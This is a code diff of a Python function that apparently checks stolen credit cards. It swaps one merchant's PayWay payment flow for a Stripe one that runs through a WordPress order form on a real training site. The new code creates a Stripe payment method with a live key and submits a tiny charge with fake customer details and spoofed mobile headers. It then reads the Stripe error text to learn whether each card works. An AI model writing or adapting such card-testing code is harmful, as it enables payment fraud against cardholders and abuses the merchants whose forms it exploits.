@@ -18,13 +18,34 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 	
 	headers = {
-	    'authority': 'api.payway.com.au',
+	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'authorization': 'Basic UTMwMDAwX1BVQl9manV3OWhkZHNrZmN2Z3F2OW1ocHlwNG44cmtoZnNyZmU5OWFnNnluZHdhZjY1ajRuM254NjRkbnVhaXE6',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb53c070b35%3B+stripe-js-v3%2Fb53c070b35%3B+card-element&key=pk_live_51PRegF00TTHUs6jX6LXxmxDwrkbBQElrmJX4JVJBCwPqekhlkYKZkW4yUNMBgA7Ae8GggAsKdSACvG6QqnEXza8U00QlHuzENi'
+	
+	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
+	
+	headers = {
+	    'authority': 'trainingedge.org',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://api.payway.com.au',
-	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
+	    'origin': 'https://trainingedge.org',
+	    'referer': 'https://trainingedge.org/order-your-certificate/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -32,59 +53,25 @@ def Tele(ccx):
 	    'sec-fetch-mode': 'cors',
 	    'sec-fetch-site': 'same-origin',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-no-authenticate-basic': 'true',
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = {
-	    'paymentMethod': 'creditCard',
-	    'connectionType': 'FRAME',
-	    'cardNumber': f'{n}',
-	    'cvn': f'{cvc}',
-	    'cardholderName': 'Dao Khao Saard',
-	    'expiryDateMonth': f'{mm}',
-	    'expiryDateYear': f'{yy}',
-	    'threeDS2': 'false',
+	params = {
+	    't': '1748961671842',
 	}
 	
-	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
+	data = f'data=__fluent_form_embded_post_id%3D1037%26_fluentform_8_fluentformnonce%3D1e05e2c65b%26_wp_http_referer%3D%252Forder-your-certificate%252F%26input_text%3DGeneral%26names%255Bfirst_name%255D%3DRodam%26names%255Blast_name%255D%3DUser%26email%3Drodamuser08%2540gmail.com%26phone%3D%252B14303000850%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26payment_input_3%3DNone%26custom-payment-amount%3D0.508%26payment_method%3Dstripe%26names_1%255Bfirst_name%255D%3D%26names_1%255Blast_name%255D%3D%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=8'
 	
-	tok = response.json()['singleUseTokenId']
-	#print(tok)
-	
-	headers = {
-	    'authority': 'www.hutcheonandpearce.com.au',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'cache-control': 'max-age=0',
-	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://www.hutcheonandpearce.com.au',
-	    'referer': 'https://www.hutcheonandpearce.com.au/secure-payments/',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'same-origin',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	}
-	
-	data = {
-	    'transactionType': 'payment',
-	    'orderNumber': '1000',
-	    'customerName': 'Dao Khao Saard',
-	    'customerNumber': '1',
-	    'principalAmount': f'{random_amount1}.{random_amount2}',
-	    'singleUseTokenId': f'{tok}',
-	}
-	
-	response = session.post('https://www.hutcheonandpearce.com.au/process-payment', headers=headers, data=data)
+	response = session.post(
+	    'https://trainingedge.org/wp-admin/admin-ajax.php',
+	    params=params,
+	    headers=headers,
+	    data=data,
+	)
 	
 	try:
-		result = re.search(r'<br>Response Text : (.*?)      </div>', response.text).group(1)
+		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
 	except:
-		result = re.search(r'<strong>PayWay (.*?)<', response.text).group(1)
-		
+		result = response.text
+	
 	return (result)
